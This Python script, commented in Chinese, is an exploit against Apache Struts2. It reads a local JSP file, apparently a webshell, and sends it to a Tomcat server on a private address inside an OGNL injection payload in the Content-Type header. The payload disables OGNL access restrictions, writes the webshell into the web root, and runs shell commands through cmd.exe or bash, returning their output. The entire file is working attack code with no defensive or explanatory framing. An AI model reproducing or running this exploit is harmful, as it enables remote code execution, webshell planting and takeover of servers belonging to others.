import httpx
from pathlib import Path
import urllib.parse


# 定义读取文件内容的函数
def read_file(file_path):
    with open(file_path, "r", encoding="utf-8") as file:
        return file.read()


# 读取 index.jsp 文件的内容
CURRENT_DIR = Path(__file__).parent
# file_path = CURRENT_DIR / 'index.jsp'
# file_path = CURRENT_DIR / 'tide-sec.jsp'
file_path = CURRENT_DIR / "tomcat_origin.jsp"
content = read_file(file_path)
# encoded_content = content.encode('utf-8')
content_encoded = urllib.parse.quote(content)

# 打印内容以验证
# print(content)


# 设置请求的 URL
url = "http://192.168.1.215:8080/"

# content = "eval(self.webshell_txt_+ self.num)"
# filename = "/index.jsp"
filename = "/tomcat_origin.jsp"


# 设置请求头
headers = {
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.8,es;q=0.6",
    "Connection": "close",
    "Content-Type": f"%{{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='{content_encoded}').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'{filename}').append(new java.net.URLDecoder().decode(#shell,'UTF-8'))).close()).(#cmd='echo \\\"write file to '+#path+'\"+ self.num +\"t00ls.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}.multipart/form-data",
}

# 发送 POST 请求
response = httpx.post(url, headers=headers)

# 打印响应结果
print(response.status_code)
print(response.text)
